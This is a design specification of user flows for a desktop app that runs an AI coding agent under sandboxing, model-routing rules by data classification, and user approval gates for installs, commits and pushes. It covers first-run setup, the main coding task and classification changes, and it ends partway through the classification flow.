# B02 User flows

This deliverable specifies the user flows of the Warden PoC desktop app as Mermaid flowcharts with every decision point, each followed by a numbered narrative naming the API calls (core §6) and events (core §5) that drive each step. Screen, state and component names are those of core §11 and B01; layouts are in B03; microcopy keys (`setup.path.api_key` and so on) are listed in the B03 §15 registry and worded in B07.

Flows:

| Id | Flow | Main screens and states |
|---|---|---|
| F1 | First run: boot, doctor (ST-2), setup with four paths (ST-1), first open with classification choice | ST-2, ST-1, SCR-1, SCR-2 |
| F2 | Primary journey, task T1 on `ts-express-api` | SCR-2, SCR-3, SCR-4, SCR-5 |
| F3 | Classification change to `confidential` and back | SCR-1, SCR-2, ST-3 |
| F4 | Cancellation and resume from last gate | SCR-2, ST-5 |
| F5 | Security scenario S1 as the user experiences it in `injection-lab` | SCR-2, SCR-4, SCR-7 |
| F6 | Audit verify and export, including ST-6 | SCR-7, SCR-2, ST-6 |

Conventions: "UI calls X" means the desktop sends JSON-RPC method X over the bridge (B08); "event X" means a notification `event` whose envelope `type` is X arrives on the session subscription (`event.subscribe {session_id}`) or the global one (`event.subscribe {session_id: "*"}`, B01 §4.1). Decision nodes are diamonds; every branch of a diamond is labeled.

## F1. First run

### F1.1 Boot, doctor and provider check

```mermaid
flowchart TD
  A1["Launch app"] --> A2["Tauri starts wardend sidecar<br/>token passed on stdin (CF-14)"]
  A2 --> A3["UI: system.hello {token, client, protocol warden.poc/1}"]
  A3 --> D1{"hello result"}
  D1 -- "protocol_mismatch -32011" --> E1["Blocking page boot.protocol_mismatch<br/>no further calls"]
  D1 -- "unauthorized or no socket after 10 s" --> E2["Connection Banner error.daemon_disconnected<br/>Retry"]
  E2 --> A3
  D1 -- "ok" --> A4["UI: system.doctor"]
  A4 --> D2{"Any check fail with blocking true?"}
  D2 -- "yes" --> ST2["ST-2 wizard step 0: DoctorChecklist<br/>fix hints, Copy command, Re-run checks"]
  ST2 --> D3{"User action"}
  D3 -- "Re-run checks" --> A4
  D3 -- "Open Doctor or Settings from nav rail" --> NAV["SCR-7 or SCR-6 reachable, ST-2 Banner stays"]
  D2 -- "no (warnings allowed)" --> A5["UI: provider.list"]
  A5 --> D4{"Any provider test ok or harness enabled?"}
  D4 -- "yes" --> SCR1["SCR-1 Workspace home"]
  D4 -- "no" --> ST1["ST-1 SetupWizard: choose a path (F1.2)"]
  ST1 --> SCR1
```

The boot flow establishes the connection, then runs the doctor before anything else, as the brief requires: a blocking sandbox failure (ST-2) is shown first and cannot be skipped, because every request needs a sandbox and there is no unsandboxed fallback. The user is not trapped: the nav rail still reaches Doctor and Settings. Only when no blocking failure remains does the app check providers; with none configured, the setup wizard (ST-1) opens, otherwise the workspace home.

Narrative:

1. The Tauri shell starts `wardend` as a sidecar with a fresh token on stdin; the daemon writes it to `~/.warden/run/token` (CF-14). The UI shows `boot.connecting`.
2. UI calls `system.hello {token, client: {name: "warden-desktop", version}, protocol: "warden.poc/1"}`. Result `daemon_version`, `mode` (`personal`/`shared`), `features[]`. `mode` is kept for F1.2 path D (harness lock).
3. Error `protocol_mismatch` (-32011) shows the blocking page `boot.protocol_mismatch`; `unauthorized` (-32001) or no socket after 10 s shows the connection Banner with Retry.
4. UI calls `system.doctor` → `checks[{id, group, status, title, detail, fix_hint, blocking}]`. Event `runtime.start` has already been written on the system chain.
5. If any check has `status: fail` and `blocking: true` (typical: bubblewrap missing, unprivileged user namespaces disabled, `sandbox-exec` unavailable, keychain locked), the wizard shows step 0 (ST-2): the failing checks first, each with `detail`, `fix_hint` rendered as a copyable command, and Re-run checks. Warnings (`status: warn`, for example L2 Docker absent) are listed but do not block.
6. After a clean doctor, UI calls `provider.list`. If no provider has a successful last test and no harness is enabled, the wizard continues with ST-1 (F1.2); else it navigates to SCR-1.

### F1.2 Setup paths (ST-1)

```mermaid
flowchart TD
  W0["ST-1 SetupWizard<br/>four path cards"] --> P{"Path chosen"}

  P -- "A: API key" --> A1["Pick vendor: anthropic (T3) or openai (T3)"]
  A1 --> A2["Paste key in masked field<br/>value never kept in UI state"]
  A2 --> A3["provider.add {spec, secret {value}, confirm true}"]
  A3 --> A4{"test.ok?"}
  A4 -- "auth_failed" --> A5["Inline error setup.api_key.auth_failed<br/>field cleared"] --> A2
  A4 -- "provider_unavailable or timeout" --> A6["Inline error, Retry test: provider.test"] --> A4
  A4 -- "ok" --> DONE["Show models and tier chip<br/>Continue"]

  P -- "B: Local model" --> B1["provider.test ollama and lmstudio in parallel<br/>(default catalog entries, loopback)"]
  B1 --> B2{"Detected?"}
  B2 -- "none" --> B3["setup.local.not_detected<br/>how to start Ollama or LM Studio, custom loopback URL"]
  B3 --> B4{"Custom URL is loopback?"}
  B4 -- "no" --> B5["Explain: not tier T0<br/>offer path C"] --> P
  B4 -- "yes" --> B6["provider.add {spec base_url, auth none, tier T0}"] --> B7
  B2 -- "one or both" --> B7["List models with tool_calling native or emulated,<br/>max_context"]
  B7 --> B8{"Any model with tool_calling?"}
  B8 -- "no" --> B9["Warn setup.local.no_tools<br/>usable for read-only T6 only"] --> B10
  B8 -- "yes" --> B10["provider.enable {provider_id, enabled true}"]
  B10 --> DONE

  P -- "C: Company-hosted endpoint" --> C1["Where is it hosted?<br/>Company servers T1 or Company cloud tenant T2"]
  C1 --> C2["Base URL (https required unless loopback)"]
  C2 --> C3{"Auth"}
  C3 -- "Bearer token (T1)" --> C4["Paste token, masked"]
  C3 -- "Client certificate mTLS (T1)" --> C5["Pick cert and key files<br/>paths sent, daemon reads them"]
  C3 -- "api-key header (T2 Azure)" --> C6["Paste key, masked"]
  C4 --> C7["provider.add {spec auth gateway bearer, tier T1, secret}"]
  C5 --> C8["provider.add {spec auth gateway mtls, tier T1, secret_files}"]
  C6 --> C9["provider.add {spec auth api_key header api-key, tier T2, secret}"]
  C7 --> C10{"test result"}
  C8 --> C10
  C9 --> C10
  C10 -- "TLS or DNS error" --> C11["setup.company.tls_error<br/>edit URL or certificate"] --> C2
  C10 -- "auth_failed" --> C12["setup.company.auth_failed"] --> C3
  C10 -- "ok, tool_format_unsupported" --> C13["Warn: emulated tool calling"] --> DONE
  C10 -- "ok" --> C14["Models listed, note: admissible for confidential"] --> DONE

  P -- "D: Subscription harness" --> D1["Pick harness: copilot, codex, claude-code"]
  D1 --> D2{"mode shared and harness is claude-code?"}
  D2 -- "yes" --> D3["Locked: harness.locked.shared_mode<br/>offer path A with anthropic"] --> P
  D2 -- "no" --> D4["Vendor-terms notice<br/>permitted, tolerated or personal_use_only"]
  D4 --> D5{"Terms need acknowledgment?<br/>tolerated or personal_use_only"}
  D5 -- "yes" --> D6["Checkbox: I understand"] --> D7
  D5 -- "no (permitted)" --> D7["provider.test {harness id}<br/>CLI installed and logged in?"]
  D7 --> D8{"test.ok?"}
  D8 -- "not installed or not logged in" --> D9["Instructions: install CLI, sign in in the vendor CLI<br/>Re-test"] --> D7
  D8 -- "ok" --> D10["provider.enable {provider_id, enabled true, acknowledge_terms}"]
  D10 --> D11{"result"}
  D11 -- "vendor_terms -32012" --> D3
  D11 -- "ok" --> D12["Notice setup.harness.pin_only"] --> DONE

  DONE --> Q{"Add another path?"}
  Q -- "yes" --> P
  Q -- "no" --> SCR1["SCR-1 Workspace home"]
```

The setup wizard offers the four paths the brief requires (CF-36). Every path ends in a live test by the daemon, never a local check in the UI, and secrets go from a masked field straight into `provider.add`, which stores them in the keychain (BI-3). The local path detects Ollama and LM Studio through the daemon on loopback; a non-loopback URL is redirected to the company-hosted path because it is not tier T0. The company-hosted path covers both tier T1 (bearer token or client certificate) and tier T2 (a company cloud tenant with the Azure `api-key` header). The harness path shows the vendor-terms notice before enabling, requires acknowledgment for `tolerated` and `personal_use_only`, refuses `claude-code` in shared mode, and ends with the notice that harnesses run only when pinned (core §13.7).

Narrative:

1. The wizard shows four cards (`setup.path.api_key`, `setup.path.local`, `setup.path.company`, `setup.path.harness`), each with the tier it yields and whether that tier is admissible for `confidential` (T0, T1, T2 yes; T3, T4 no, BI-7). CLI equivalents are shown per card.
2. **Path A, API key.** The user picks `anthropic` or `openai`, pastes the key into a password field and presses Save. UI calls `provider.add {spec: {id: "anthropic", protocol: "anthropic-messages", base_url, auth: {mode: "api_key", secret: "secret://providers/anthropic/api_key"}, tier: "T3"}, secret: {value}, confirm: true}`. The UI clears the field and drops the value from memory as soon as the call is sent. Result `{provider_id, test}`; event `provider.configured {action: add, tier: T3, auth_mode: api_key, secret_ref, result}` (system chain; `secret_ref` only, never the value). `test.ok: false` with `auth_failed` shows `setup.api_key.auth_failed` and an empty field; `provider_unavailable`/`timeout` offers Retry test (`provider.test {provider_id}`).
3. **Path B, local model.** UI calls `provider.test {provider_id: "ollama"}` and `provider.test {provider_id: "lmstudio"}` in parallel (default catalog entries on `127.0.0.1:11434` and `:1234`). For each ok result the wizard lists `models[{model_id, tool_calling, structured_output, streaming, max_context}]`. The user keeps the detected server(s) enabled: `provider.enable {provider_id, enabled: true}`. If nothing is detected, `setup.local.not_detected` explains how to start the server and pull a model and offers a custom URL; a loopback URL is added with `provider.add {spec: {protocol: "openai-compatible", auth: {mode: "none"}, tier: "T0"}}`, a non-loopback URL is refused for T0 with a link to path C. If no model supports tool calling, `setup.local.no_tools` warns that only read-only requests (T6) are practical.
4. **Path C, company-hosted endpoint.** The user chooses company servers (tier T1) or a company cloud tenant (tier T2). Base URL must be `https://` unless loopback. Auth options: bearer token (T1), client certificate (T1: the UI opens the Tauri file dialog for the certificate and key and passes their paths as `secret_files {cert, key}`; the daemon reads and stores them in the keychain, the webview never reads key material), or `api-key` header (T2). UI calls `provider.add` with `auth: {mode: "gateway", kind: "bearer" | "mtls"}` or `auth: {mode: "api_key", header: "api-key"}`. The result's `test` decides: TLS/DNS errors show `setup.company.tls_error`; `auth_failed` returns to the auth step; `tool_format_unsupported` on the probe warns that emulated tool calling will be used; ok lists the models with the note "admissible for confidential" (`setup.company.admissible`).
5. **Path D, subscription harness.** The user picks `copilot`, `codex` or `claude-code`. If `system.hello.mode` is `shared` and the harness is `claude-code`, the card is locked (`harness.locked.shared_mode`) and path A is offered. Otherwise the vendor-terms notice is shown (`harness.terms.permitted`, `harness.terms.tolerated`, `harness.terms.personal_use_only`); for `tolerated` and `personal_use_only` an acknowledgment checkbox must be ticked. UI calls `provider.test {provider_id}`; if the vendor CLI is missing or not logged in, instructions are shown (the login stays in the vendor CLI; Warden never asks for it). Then `provider.enable {provider_id, enabled: true, acknowledge_terms: true}`; `vendor_terms` (-32012) is shown as locked. Event `provider.configured {action: enable}`. The final notice `setup.harness.pin_only` says the harness runs only when pinned in a session's model picker.
6. After any successful path the user may add another path or continue to SCR-1. If the only configured access is a harness, SCR-1 shows the reminder that requests need a pin (otherwise the first run hits ST-3 with reason `harness_not_pinned`, F3.3).

### F1.3 First open of a workspace and classification choice (CF-01)

```mermaid
flowchart TD
  O1["SCR-1: Open directory<br/>Tauri directory dialog"] --> O2{"Workspace already known?<br/>workspace.list"}
  O2 -- "yes" --> O9["session.open {workspace}<br/>stored classification applies"]
  O2 -- "no" --> O3["First-open dialog<br/>classification select, default confidential"]
  O3 --> O4["provider.models {classification}<br/>admissible count for the selection"]
  O4 --> D1{"Any admissible model for the selection?"}
  D1 -- "no" --> O5["Warning firstopen.none_admissible<br/>Add local or company-hosted model, or pick another classification"]
  O5 --> D2{"User action"}
  D2 -- "Add provider" --> O6["/setup/local or /setup/company"] --> O4
  D2 -- "Change selection" --> O3
  D2 -- "Open anyway" --> O7
  D1 -- "yes" --> O7["Open: session.open {workspace, classification}"]
  O9 --> D3{"session.open result"}
  O7 --> D3
  D3 -- "sandbox_unavailable -32006" --> ST2["ST-2 Banner, open blocked"]
  D3 -- "unsupported_in_poc -32010" --> E3["Inline error, restricted not offered in PoC"]
  D3 -- "not a git repository (invalid_state)" --> E4["Inline error with CLI hint git init"]
  D3 -- "ok" --> SCR2["SCR-2 Session view<br/>header: classification, sandbox, capability summary"]
```

The first time a directory is opened, a dialog asks for its classification with `confidential` preselected, the WRD-01/WRD-06 default kept by CF-01; for the demo the presenter picks `internal` (or uses `warden open <dir> --classification internal`). The dialog previews how many configured models would be admissible for the chosen classification, so a user with only a vendor API key sees before opening that `confidential` would leave no model. Known workspaces open directly with their stored classification.

Narrative:

1. SCR-1 Open directory (disabled under ST-2) opens the native directory dialog; the chosen path is matched against `workspace.list` roots.
2. For an unknown root, the first-open dialog (`firstopen.title`, `firstopen.body`) shows a select with `public`, `internal`, `confidential` (default). `restricted` is not listed (CF-02).
3. On every change of the select, UI calls `provider.models {classification}` (ID-13) and shows "3 models admissible" or `firstopen.none_admissible` with actions Add local model, Add company-hosted model, Change selection, Open anyway.
4. Open calls `session.open {workspace: <path>, classification}`. Result `{session_id, workspace_id, classification, sandbox_level, branch, capabilities_summary, resumed}`. Events: `session.open`, `worktree.create {branch, base_commit}`; the first open also emits `workspace.classification {from: null, to}` on the system chain.
5. Errors: `sandbox_unavailable` → ST-2; `unsupported_in_poc` → inline error; a non-git directory → inline error (`error.not_a_repository`) with `git init` hint.
6. Navigation to `/sessions/:session_id`; the header shows the classification badge, "L1 · Seatbelt" and the capability summary chip (WRD-16 §3 step 2).

## F2. Primary journey: task T1

```mermaid
flowchart TD
  S1["SCR-2: type request, Model Automatic<br/>Mod+Enter"] --> S2["session.request {session_id, text}<br/>returns run_id"]
  S2 --> S3["Timeline: Request entry, Run 1 header<br/>task plan queued then running"]
  S3 --> S4["RoutingLine: Chosen local/qwen-coder-32b (T0)<br/>because prefer-internal; internal data; 3 candidates"]
  S4 --> S5["plan runs read-only: fs.read, fs.list, fs.search rows"]
  S5 --> D0{"plan task result"}
  D0 -- "failed or no_admissible_model" --> X0["Task failed card or ST-3"]
  D0 -- "succeeded" --> G1["SCR-3 G1: PlanCard<br/>2 steps, 4 expected files, est. 0.00 local, 2 risks"]
  G1 --> D1{"User decision at G1"}
  D1 -- "Reject (R), confirm inline" --> R1["workflow.resolveGate reject<br/>run cancelled, reason rejected<br/>composer prefilled"]
  D1 -- "Edit plan (Mod+E)" --> E1["Edit summary and steps inline<br/>validate"]
  E1 --> D2{"Valid?"}
  D2 -- "no" --> E1
  D2 -- "yes, Save and approve (Mod+Enter)" --> G1A["workflow.resolveGate approve<br/>with edited_artifact"]
  D1 -- "Approve (A)" --> G1B["workflow.resolveGate approve"]
  G1A --> I1
  G1B --> I1["task implement running<br/>RoutingLine, tool calls stream collapsed"]
  I1 --> I2["Model proposes proc.exec npm install"]
  I2 --> I3["policy.decision approval_required<br/>rule user.package-install, R4, scope_max workspace"]
  I3 --> A1["SCR-4 ApprovalCard inline + OS notification<br/>if window unfocused"]
  A1 --> D3{"User decision"}
  D3 -- "Reject (R)" --> A2["approval.resolve reject<br/>task back to running, model gets approval_rejected"]
  D3 -- "A (Workspace preselected, ID-08)" --> A3["approval.resolve approve scope workspace"]
  A3 --> A4["policy.decision allow resolved_by_approval apr_9<br/>tool.exec.start, proxy.connect registry.npmjs.org:443"]
  A4 --> I4["Files written; npm test under node-test<br/>allow, no prompt"]
  A2 --> I4
  I4 --> V1["task verify: node-build, node-test<br/>42 passed, 1 failed<br/>model called only for failure analysis"]
  V1 --> D4{"verify passed?"}
  D4 -- "yes" --> G2
  D4 -- "no, repair round left" --> R2["task repair-1<br/>analysis: 404 branch missing in src/routes/users.ts"]
  R2 --> V2["task verify-2: 43 passed<br/>no model call (ID-09)"]
  V2 --> D5{"verify-2 passed?"}
  D5 -- "no" --> F1["Run failed(verification)<br/>read-only result, Iterate, Export patch (CF-24)"]
  D5 -- "yes" --> G2["SCR-5 G2: diff, TestReport 43 passed,<br/>CostPanel 0.00, chain verified"]
  G2 --> D6{"User decision at G2"}
  D6 -- "Discard result (R), confirm inline" --> R3["workflow.resolveGate reject<br/>run cancelled, reason rejected<br/>nothing delivered"]
  D6 -- "Accept result (A)" --> AC["workflow.resolveGate approve<br/>final-result, chain.checkpoint,<br/>workflow.end succeeded"]
  AC --> D7
  D6 -- "Iterate" --> IT["resolveGate approve comment iterate<br/>run succeeded, then session.request"]
  D6 -- "Commit…" --> C0["Dialog: branch warden/ulid, message<br/>Accept and commit: resolveGate approve first"]
  C0 --> C1
  D6 -- "Apply to branch… or Export patch" --> AP0["Accept first, then deliver"] --> D7
  D7{"Delivery action after the run"} -- "Commit" --> C1["workflow.deliver commit<br/>policy.decision, tool.exec host,<br/>workflow.delivered: 3f9c2a1,<br/>branch published in the repository"]
  C1 --> D7
  D7 -- "Apply to branch" --> AP["workflow.deliver apply_branch<br/>publishes branch without squash"]
  AP --> D7
  D7 -- "Export patch" --> EP["workflow.deliver export_patch"]
  D7 -- "Push, after commit or apply" --> P1["Push dialog: remote origin, branch<br/>workflow.deliver push<br/>status approval_pending apr_14"]
  P1 --> P2["SCR-4 ApprovalCard R5, scope fixed once"]
  P2 --> D8{"User decision"}
  D8 -- "Approve (A)" --> P3["approval.resolve approve once<br/>host push, workflow.delivered push"]
  D8 -- "Reject (R)" --> P4["approval.resolve reject<br/>Push rejected. Nothing was pushed."]
```

The primary journey is the WRD-16 §3 demo steps 3 to 6 as the user experiences them. Every effect is preceded by a visible decision: the routing line before the model works, the plan card before any write, the approval card before `npm install` runs, and the confirmation dialog or approval card before each delivery action. The fixture is built so that the first verification fails on the 404 path, which triggers the single repair round; the second verification passes with 43 tests, and only then does G2 appear (H4). If the second verification also failed, the run would end without G2 and show a read-only result (CF-24). Accepting G2 ends the run as succeeded; delivery follows on the same view (core §15 ID-01, ID-02). The demo ends with a commit that publishes the branch `warden/<ulid>` in the repository and a rejected push.

Narrative (canonical demo values from core §12; ids abbreviated):

1. **Submit.** The user types "Add a GET /users/:id endpoint returning the user or 404, with tests." into `RequestComposer` with Model "Automatic" and presses `Mod+Enter`. UI calls `session.request {session_id, text}` → `{run_id: wfr_1}`. The composer switches to the run status strip. Events: `session.request {run_id, kind: change, text, text_hash, pin_model: null}`, `workflow.start {template: poc-coding}`, `task.state plan created→queued→running`.
2. **Routing.** Event `routing.decision {task_class: plan, classification: internal, strategy: prefer-internal, chosen: {model_id: local/qwen-coder-32b, tier: T0}, explanation: "prefer-internal; internal data; 3 candidates", candidates[…]}`. The `RoutingLine` renders "Chosen: local/qwen-coder-32b (T0) because prefer-internal; internal data; 3 candidates"; its details list `anthropic/claude-sonnet` (admitted, not chosen), `local/qwen-coder-7b` (admitted, prior 0.3 below threshold) and `copilot` (rejected, `harness_not_pinned`).
3. **Plan task runs.** Events per step: `sandbox.create`, `context.assembled`, `model.call.start {step}`, `stream.delta` (live activity line), `model.call.end {usage}`, then per tool call `policy.decision {effect: allow, matched_rules: [user.reads-in-worktree]}` → `tool.exec.start` → `tool.exec.end`. The `TaskCard` step counter and tool call summary update. `artifact.created {type: plan}`, `task.state plan running→succeeded`.
4. **G1 presented.** Events `task.state gate-plan →waiting_for_approval`, `workflow.gate.presented {gate_key: gate-plan, artifacts: [art_plan]}`. The gate entry is appended with the full `PlanCard` inline and the sticky `GateBar` below the timeline; UI calls `artifact.read {id: art_plan}`. Focus does not move (B05 §7.1); the entry is announced, the `PendingApprovalBadge` shows "G1 open", and an OS notification (`notify.gate.*`) is sent if the window is unfocused. The user reaches the gate with `G` then `A` or a click.
5. **G1 decision.** Approve plan (`A`) → `workflow.resolveGate {run_id, gate_id, decision: approve}`. Edit plan (`Mod+E`) → the inline `PlanCard` becomes an editor; "Save and approve" (`Mod+Enter`) validates and calls `workflow.resolveGate {decision: approve, edited_artifact: <plan JSON>}`; events `artifact.edited {edited_by}` then `workflow.gate.resolved {edited_artifact}`. Reject (`R`) opens an inline confirmation; confirming calls `workflow.resolveGate {decision: reject, comment}`; the run ends `cancelled` with reason `rejected` (ID-01) and the composer is prefilled with the request text. After approval: `worktree.checkpoint {label: gate-plan}`.
6. **Implement.** `task.state implement →running`, new `routing.decision` (task class `implement`, same model). Tool calls stream in collapsed; `fs.write`/`fs.patch` rows show `user.writes-in-worktree`.
7. **Inline approval.** The model proposes `proc.exec ["npm","install"]`. Events: `policy.decision {call_id: call_31, effect: approval_required, reason: "egress to registry.npmjs.org:443 is not in the task allowlist", matched_rules: [user.package-install], approval: {approval_id: apr_9, scope_max: workspace}}`, `approval.requested {approval_id: apr_9, risk_class: R4, scopes_allowed: [once, task, session, workspace], display{what, who, why}}`, `task.state implement running→waiting_for_approval`. The `ApprovalCard` appears expanded in the task; the task pulses in `color-state-waiting`; OS notification `notify.approval.*` if unfocused. The wall clock of the task pauses (CF-38).
8. **Approval decision.** The card opens with Workspace preselected because the rule is `user.package-install` (ID-08); the consequence text is visible. The user presses `A`. UI calls `approval.resolve {approval_id: apr_9, decision: approve, scope: workspace}`. Events: `approval.resolved {decision: approve, scope: workspace, approver: local:<user>}`, `policy.decision {call_id: call_31, effect: allow, resolved_by_approval: apr_9}`, `task.state →running {reason: approved}`, `tool.exec.start`, `proxy.connect {host: registry.npmjs.org, port: 443}` (sub-row), `tool.exec.end {exit_code: 0}`. The card collapses to "Approved · workspace · by you". Reject (`R`) calls `approval.resolve {decision: reject}`; the task returns to `running` and the model receives `{ok: false, error: {code: "approval_rejected"}}`, so it may adapt or stop (ID-10).
9. **Profile commands.** `proc.exec ["npm","test"]` → `policy.decision {effect: allow, matched_rules: [user.profile-commands]}`: no prompt. `artifact.created {type: code-diff}`, `worktree.checkpoint {label: implement}`, `task.state implement →succeeded`.
10. **Verify.** `task.state verify →running`; the runtime runs `node-build` and `node-test` as policy-checked `proc.exec` calls (actor `verifier`); because a test failed, the verifier model is called for the failure analysis (`routing.decision {task_class: verify, strategy: cost-first}`, `model.call.*`, ID-09); `artifact.created {type: test-report}` with 42 passed, 1 failed ("GET /users/:id returns 404 for unknown id: expected 404, received 200"); `task.state verify →failed {reason: verification}`. The card turns `color-state-failed` with the `TestReport` line.
11. **Repair.** `task.state repair-1 →running`; the repair card shows "Repair round 1 of 1 · 1 failing test" and the analysis excerpt. It produces `code-diff` v2 (`supersedes` v1, CF-26); `worktree.checkpoint {label: repair}`.
12. **Verify-2.** `task.state verify-2 →succeeded`; test report 43 passed, 0 failed; build and tests are green, so no `routing.decision` or `model.call.*` is emitted and the analysis is generated deterministically (ID-09).
13. **G2 presented.** `workflow.gate.presented {gate_key: gate-final, artifacts: [code-diff v2, test-report v2]}`. The G2 gate entry is appended ("4 files +86 −3 · 43 passed · $0.00"); OS notification `notify.gate.*` if unfocused. "Review result" opens the review layout (`/gate/final`). UI calls `artifact.read` for both artifacts and `audit.verify {session_id, strict: true}` (ASM); the chain badge goes `verifying` → `verified`.
14. **Accept or commit.** "Accept result" (`A`) calls `workflow.resolveGate {decision: approve}`; per ID-01 the run ends at once: `workflow.gate.resolved`, `task.state gate-final →succeeded`, `artifact.created {type: final-result}`, `chain.checkpoint {trigger: workflow_end}`, `workflow.end {status: succeeded, final_result}`; the line "Result accepted · run succeeded" appears. "Commit…" pressed while the gate is still open does the same first: its dialog (`confirm.commit`: branch name default `warden/01jaxr8q7m2v9ktc3f6yh5n0pb`, prefilled message) confirms with "Accept and commit", which sends `workflow.resolveGate {approve}`, waits for `workflow.gate.resolved`, then sends `workflow.deliver {run_id, action: commit, message, branch_name}`. Delivery is post-run (ID-02): events `policy.decision` for `git.commit` with `actor.kind: user` (`user.git-commit-session-branch`), `tool.exec.start {executor: host}`, `tool.exec.end`, `workflow.delivered {action: commit, commit: 3f9c2a1, branch}`. The commit squashes the session diff and publishes the branch in the user's repository (ID-03). Delivery line "Committed 3f9c2a1, branch warden/01jaxr8q… published". Push becomes enabled. "Discard result" (`R`, inline confirmation) instead ends the run `cancelled`, reason `rejected`, with nothing delivered.
15. **Push.** Push is enabled only after a commit or an applied branch in this session (ID-03; otherwise `invalid_state`). "Push…" opens a dialog for the remote (from `workflow.get` → `repository.remotes[]`, default `origin`) and the published branch; confirming calls `workflow.deliver {action: push, remote: origin, branch_name}` → `{status: approval_pending, approval_id: apr_14}`. Events `policy.decision {effect: approval_required, matched_rules: [user.git-push]}`, `approval.requested {risk_class: R5, scope_max: once, scopes_allowed: [once]}`. The `ApprovalCard` opens inside the G2 `GateBar`, announced politely but not focused (ID-15), with the scope fixed to Once (other segments disabled, `scope.disabled.risk_r5`).
16. **Reject push.** The user focuses the card (`G` then `A`) and presses `R` → `approval.resolve {approval_id: apr_14, decision: reject, scope: once}` → `approval.resolved {decision: reject}`. Delivery line `delivery.push_rejected` ("Push rejected by you. The commit stays on the published branch."). Approving instead would run the host-side push (`tool.exec.start/end` for `git.push`, executor `host`, then `workflow.delivered {action: push}`) and show `delivery.done.push`.
17. Approval prompts beyond the gates in this run: 2 (install, push), within the H6 limit of 3.

Decision points summary:

| Point | Options | API | Outcome |
|---|---|---|---|
| Model at submit | Automatic or a pinned admissible model | `session.request {pin_model}` | Pin persists for the session |
| G1 | Approve, Edit then approve, Reject | `workflow.resolveGate` | Implement starts, or run `cancelled(rejected)` |
| Install approval | Workspace preselected; scope 1 to 4, Approve or Reject | `approval.resolve` | Install runs with registry egress, or task continues with `approval_rejected` |
| Verify | Pass → G2; fail with round left → repair; fail after repair → failed result | none (runtime) | CF-24 |
| G2 | Accept result, Discard result, Iterate, or a delivery (accepts first) | `workflow.resolveGate`, `session.request` | Run `succeeded` or `cancelled(rejected)` |
| Delivery (post-run) | Commit, Apply to branch, Export patch, Push (after commit or apply) | `workflow.deliver` | `workflow.delivered` per action |
| Push approval | Approve (once) or Reject | `approval.resolve` | Push or nothing pushed |

## F3. Classification change to `confidential`

```mermaid
flowchart TD
  C0["User opens classification menu<br/>SCR-1 row select or session header badge"] --> C1{"Direction of change"}
  C1 -- "tighten: internal to confidential" --> T2["workspace.setClassification {workspace_id, confidential}<br/>applied at once, no dialog"]
  T2 --> T3["Notice confirm.class_tighten.note<br/>a running task pauses at its next step<br/>if its model becomes inadmissible"]
  T3 --> T4["event workspace.classification from internal to confidential<br/>header badge updates"]
  T4 --> T5["provider.models {session_id} refresh<br/>ModelPicker greys anthropic/claude-sonnet (T3), copilot (T4)<br/>reason tier_not_admitted"]
  T5 --> T6{"Session pin inadmissible?"}
  T6 -- "yes" --> T7["Composer warning composer.pin_inadmissible<br/>Use automatic routing or pick company/qwen-coder-32b"]
  T6 -- "no" --> T8
  T7 --> T8{"Task running on a now-inadmissible model?"}
  T8 -- "no" --> T9["Next request routes to company/qwen-coder-32b (T1)<br/>or local (T0); run completes"]
  T8 -- "yes" --> T10["At next step: task.state waiting_for_input<br/>reason no_admissible_model: ST-3 card"]
  T10 --> D1{"User action on ST-3 card"}
  D1 -- "Continue on company/qwen-coder-32b" --> T11["session.setPin (ID-04)<br/>task.state running, reason input_provided"]
  D1 -- "Configure provider" --> T12["/setup/company or /setup/local"]
  D1 -- "Change classification" --> L1
  D1 -- "Cancel run" --> T13["session.cancel: F4"]
  T11 --> T9
  C1 -- "loosen: confidential to internal" --> L1["Confirmation dialog classification.loosen.confirm<br/>lists newly admissible tiers T3, T4 and affected sessions"]
  L1 --> D2{"Confirm?"}
  D2 -- "Keep confidential" --> C9["No change"]
  D2 -- "Loosen to internal" --> L2["workspace.setClassification {classification internal, confirm true}"]
  L2 --> L3{"result"}
  L3 -- "confirmation_required -32005" --> L1
  L3 -- "ok" --> L4["event workspace.classification<br/>effect from the next task; running tasks keep their model"]
```

Changing a workspace to `confidential` is the enterprise demo moment (WRD-16 §3 step 7, §15 item 8). Tightening needs no confirmation because it only removes options; it is applied at once with a notice that a running task pauses at its next step if its model becomes inadmissible (B05 §7.4). The model picker immediately shows vendor models greyed with the reason code, and the next run goes to the company-hosted or local model. A task that is running on a model that just became inadmissible pauses at its next step instead of switching silently (core §13.7) and shows the ST-3 card with a one-click continuation on an admissible model. Loosening always requires an explicit confirmation dialog that names the tiers becoming admissible and the affected sessions, and it takes effect only at the next task.

Narrative:

1. The classification control is the `StatusBadge classification` menu in the session header or the select in the `WorkspaceRow` on SCR-1. Options: `public`, `internal`, `confidential`, with the current value checked.
2. **Tightening** (`internal` → `confidential`). UI calls `workspace.setClassification {workspace_id, classification: confidential}` → `{affected_sessions[]}` immediately (no dialog, B05 §7.4) and shows the notice `confirm.class_tighten.note`; when a run is active whose current model (last `routing.decision.chosen.tier` or `routing.fallback.to.tier` of the running task) is now inadmissible, the notice names it ("Run 3 will pause at its next step: anthropic/claude-sonnet (T3) is not admissible for confidential data"). Event `workspace.classification {from: internal, to: confidential, by}` on the system chain; the header badge changes to `color-class-confidential`; a system line appears in each affected session's timeline.
3. UI calls `provider.models {session_id}`. The `ModelPicker` shows `local/qwen-coder-32b` (T0), `company/qwen-coder-32b` (T1) and `local/qwen-coder-7b` (T0, below threshold for plan) as admissible, and greys `anthropic/claude-sonnet` (T3) and `copilot` (T4) with `reason_code: tier_not_admitted` and the text `routing.reason.tier_not_admitted` ("Not admissible for confidential data: T0, T1, T2 only").
4. If the session is pinned to an inadmissible model (for example after the neutrality rerun pinned to `anthropic/claude-sonnet`), the composer shows `composer.pin_inadmissible` and the submit button stays enabled only after the user picks Automatic or an admissible model (the pin is never changed silently). The next `session.request {pin_model: null | "company/qwen-coder-32b"}` routes admissibly.
5. **Mid-run pause.** If a task is running on a now-inadmissible model, the router re-checks admission before the next model call: events `routing.decision` (all candidates for the pin rejected) and `task.state →waiting_for_input {reason: no_admissible_model}`. The ST-3 card shows "Paused: anthropic/claude-sonnet (T3) is not admissible for confidential data" and the note that context already sent before the change stays with that provider's call records. Actions: Continue on company/qwen-coder-32b (`session.setPin {session_id, pin_model: "company/qwen-coder-32b"}`, or `null` for Automatic, ID-04; then `routing.decision` and `task.state →running {reason: input_provided}`), Configure provider, Change classification (goes to the loosening dialog), Cancel run (F4). A successful provider configuration or a loosening re-routes the waiting task automatically (ID-04).

